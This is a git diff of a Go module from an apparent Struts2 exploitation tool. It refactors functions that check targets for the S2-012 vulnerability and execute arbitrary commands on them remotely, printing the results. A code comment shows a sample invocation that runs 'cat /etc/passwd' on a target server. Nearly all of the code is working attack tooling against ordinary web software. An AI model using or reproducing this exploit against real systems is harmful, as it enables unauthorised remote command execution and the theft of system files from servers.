@@ -1,53 +1,26 @@
 package s012
 
 import (
-	"ST2G/cvemod/x51utils"
+	"ST2G/cvemod/utils"
 	"fmt"
-	"io/ioutil"
-	"log"
-	"net/http"
+	"github.com/fatih/color"
+	"net/url"
 	"strings"
 )
+/*
+ST2SG.exe --url http://192.168.123.128:8080/S2-012/user.action --vn 12 --mode exec --data "name=fuckit" --cmd "cat /etc/passwd"
+ */
 
-func Check(targeturl string,postData string) {
-	client := &http.Client{
-		Timeout:x51utils.Timeout,
-	}
-	postData = strings.Replace(postData,"fuckit",x51utils.POC_s012_check,1)
-	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
-	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	response, _ := client.Do(req)
-	defer response.Body.Close()
-	content, _ := ioutil.ReadAll(response.Body)
-	respBody := string(content)
-	isVulnable := strings.Contains(respBody, "6308")
-	if isVulnable {
-		x51utils.Colorlog("Found Struts2-012!")
-
-	} else {
+func Check(targetUrl string,postData string) {
+	respString := utils.PostFunc4Struts2(targetUrl,postData,"",utils.POC_s012_check)
+	if utils.IfContainsStr(respString,utils.Checkflag){
+		color.Red("*Found Struts2-012！")
+	}else {
 		fmt.Println("Struts2-012 Not Vulnerable.")
 	}
-
 }
-func ExecCommand(targeturl string,command string,postData string){
-	client := &http.Client{
-		Timeout:x51utils.Timeout,
-	}
-	postData = strings.Replace(postData,"fuckit",x51utils.POC_s012_exec(command),1)
-	req, err := http.NewRequest("POST", targeturl,strings.NewReader(postData) )
-	req.Header.Set("User-Agent", x51utils.GlobalUserAgent)
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; param=value")
-	if err != nil {
-		log.Fatal("Error reading request. ")
-	}
-	response, _ := client.Do(req)
-	defer response.Body.Close()
-	content, _ := ioutil.ReadAll(response.Body)
-	respBody := string(content)
-	x51struts2commandout := strings.Index(respBody,"x51struts2commandout")
-	fmt.Println(respBody[x51struts2commandout+20:])
+func ExecCommand(targetUrl string,command string,postData string){
+	respString := utils.PostFunc4Struts2(targetUrl,postData,"",utils.POC_s012_exec(command))
+	respString = strings.Replace(url.QueryEscape(respString),"%00","",-1)
+	fmt.Println(url.QueryUnescape(respString[13:]))
 }
